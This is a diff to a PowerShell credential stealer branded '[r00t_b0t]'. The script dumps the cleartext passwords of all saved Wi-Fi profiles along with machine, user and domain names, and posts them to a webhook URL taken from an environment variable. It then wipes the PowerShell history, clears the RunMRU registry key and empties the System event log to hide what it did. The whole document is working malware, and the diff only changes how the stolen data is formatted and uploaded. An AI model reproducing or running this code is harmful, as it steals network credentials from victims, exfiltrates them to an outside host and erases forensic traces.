@@ -1,17 +1,22 @@
 $wh=$env:WH
-$m="[r00t_b0t] "+$env:COMPUTERNAME+" | "+$env:USERNAME+"`n"
+$m="```"+"`n"
+$m=$m+"[r00t_b0t] Incoming Data"+"`n"
+$m=$m+"================================"+"`n"
+$m=$m+"PC      : "+$env:COMPUTERNAME+"`n"
+$m=$m+"User    : "+$env:USERNAME+"`n"
+$m=$m+"Domain  : "+$env:USERDOMAIN+"`n"
+$m=$m+"================================"+"`n"
+$m=$m+"WiFi Passwords :"+"`n"
+$m=$m+"--------------------------------"+"`n"
 $profiles=netsh wlan show profiles|Select-String "All User Profile"
 foreach($line in $profiles){
 $n=($line -split ":")[1].Trim()
 $key=netsh wlan show profile name=$n key=clear|Select-String "Key Content"
-if($key){$m=$m+$n+" : "+($key -split ":")[1].Trim()+"`n"}
+if($key){$m=$m+"Network  : "+$n+"`nPassword : "+($key -split ":")[1].Trim()+"`n--------------------------------`n"}
 }
-$f=$env:TEMP+"\r"+[string](Get-Random)+".txt"
-$m|Out-File $f -Encoding UTF8
-$boundary="----b"+[string](Get-Random)
-$body="--$boundary`r`nContent-Disposition: form-data; name=`"payload_json`"`r`n`r`n{`"content`":`"[r00t_b0t] $env:COMPUTERNAME | $env:USERNAME`"}`r`n--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"creds.txt`"`r`nContent-Type: text/plain`r`n`r`n$m`r`n--$boundary--"
-Invoke-RestMethod -Uri $wh -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body ([System.Text.Encoding]::UTF8.GetBytes($body))
-Remove-Item $f -Force -ErrorAction SilentlyContinue
+$m=$m+"```"
+$body=ConvertTo-Json @{content=$m}
+Invoke-RestMethod -Uri $wh -Method Post -ContentType "application/json" -Body $body
 [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
 wevtutil cl System 2>$null
